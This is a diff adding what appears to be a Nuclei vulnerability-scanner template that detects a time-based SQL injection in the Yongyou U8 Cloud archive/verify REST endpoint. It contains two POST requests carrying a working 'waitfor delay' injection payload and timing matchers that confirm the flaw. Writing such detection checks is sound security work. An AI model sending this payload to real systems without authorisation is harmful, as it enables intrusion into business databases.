@@ -1,0 +1,37 @@
+id: yongyou-u8-cloud-archive-verify-sqli
+info:
+  name: "用友U8 Cloud archive_verify SQL注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: YongyouU8Cloud
+
+http:
+  - raw:
+      - |
+        POST /u8cuapws/rest/archive/verify HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {"orgInfo":{"code":"1';waitfor delay '0:0:5'--"}}
+
+      - |
+        POST /u8cuapws/rest/archive/verify HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        {"orgInfo":{"code":"1';waitfor delay '0:0:8'--"}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "\"code\":\"9999\""
+          - "\"success\":false"
+        part: body
+
+      - type: dsl
+        dsl:
+          - "status_code == 200"
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
